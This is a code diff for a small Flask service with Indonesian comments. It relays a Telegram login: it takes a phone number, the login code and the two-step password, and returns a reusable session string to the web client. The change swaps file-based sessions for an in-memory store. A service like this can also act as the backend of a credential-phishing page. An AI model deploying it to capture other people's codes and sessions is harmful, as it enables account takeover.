@@ -10,12 +10,10 @@ load_dotenv()
 API_ID = int(os.getenv("API_ID"))
 API_HASH = os.getenv("API_HASH")
 
-SESSION_DIR = "session"
-if not os.path.exists(SESSION_DIR):
-    os.makedirs(SESSION_DIR)
-
 app = Flask(__name__)
 CORS(app)
+
+sessions = {}  # simpan sesi di RAM sementara
 
 @app.route("/")
 def home():
@@ -29,15 +27,15 @@ def send_code():
     if not phone:
         return jsonify({"error": "Nomor telepon kosong"}), 400
 
-    client = TelegramClient(f"{SESSION_DIR}/{phone}", API_ID, API_HASH)
     try:
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
         client.connect()
         client.send_code_request(phone)
-        return jsonify({"status": "code_sent"}), 200
+        sessions[phone] = client.session.save()
+        client.disconnect()
+        return jsonify({"status": "code_sent"})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
-    finally:
-        client.disconnect()
 
 @app.route("/verify_code", methods=["POST"])
 def verify_code():
@@ -45,16 +43,19 @@ def verify_code():
     phone = data.get("phone")
     code = data.get("code")
 
-    client = TelegramClient(f"{SESSION_DIR}/{phone}", API_ID, API_HASH)
+    if phone not in sessions:
+        return jsonify({"error": "Sesi tidak ditemukan. Kirim kode dulu."}), 400
+
     try:
+        session = StringSession(sessions[phone])
+        client = TelegramClient(session, API_ID, API_HASH)
         client.connect()
         client.sign_in(phone=phone, code=code)
-        session_str = StringSession.save(client.session)
+        session_str = client.session.save()
+        client.disconnect()
         return jsonify({"status": "logged_in", "session": session_str})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
-    finally:
-        client.disconnect()
 
 @app.route("/verify_password", methods=["POST"])
 def verify_password():
@@ -62,16 +63,19 @@ def verify_password():
     phone = data.get("phone")
     password = data.get("password")
 
-    client = TelegramClient(f"{SESSION_DIR}/{phone}", API_ID, API_HASH)
+    if phone not in sessions:
+        return jsonify({"error": "Sesi tidak ditemukan. Kirim kode dulu."}), 400
+
     try:
+        session = StringSession(sessions[phone])
+        client = TelegramClient(session, API_ID, API_HASH)
         client.connect()
         client.sign_in(password=password)
-        session_str = StringSession.save(client.session)
+        session_str = client.session.save()
+        client.disconnect()
         return jsonify({"status": "logged_in", "session": session_str})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
-    finally:
-        client.disconnect()
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8000)
